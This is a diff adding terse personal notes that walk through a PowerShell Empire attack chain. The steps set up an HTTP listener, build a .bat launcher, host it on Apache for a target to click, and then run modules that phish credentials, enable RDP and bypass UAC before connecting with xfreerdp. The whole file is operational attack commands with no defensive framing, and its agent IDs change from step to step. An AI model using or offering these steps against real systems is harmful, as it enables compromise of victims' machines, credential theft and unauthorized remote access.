@@ -1,0 +1,54 @@
+powershell-empire server
+
+*on another terminal
+
+powershell-empire client
+
+uselistener http
+
+set Port 4321
+
+execute
+
+listeners
+
+usestager windows/launcher_bat
+
+set listener http
+
+execute
+
+systemctl start apache2.service 
+
+mv (generated file) /var/www/html/launcher.bat
+
+*after your target click on it
+
+usemodule powershell/collection/toasted
+
+set VerifyCreds True
+
+set Agent 274L2PBU
+
+execute
+.......................................................
+agents
+
+interact 27hssaba
+usemodule powershell/management/enable_rdp
+execute
+usemodule powershell/privesc/bypassuac
+set Agent 27dbdjbkd
+set Listener http
+execute
+
+agents
+interact NGHRSJ
+usemodule powershell/management/enable_rdp
+execute
+
+..............................................
+xfreerdp /u:name  /p:password /v:ip address
+
+
+
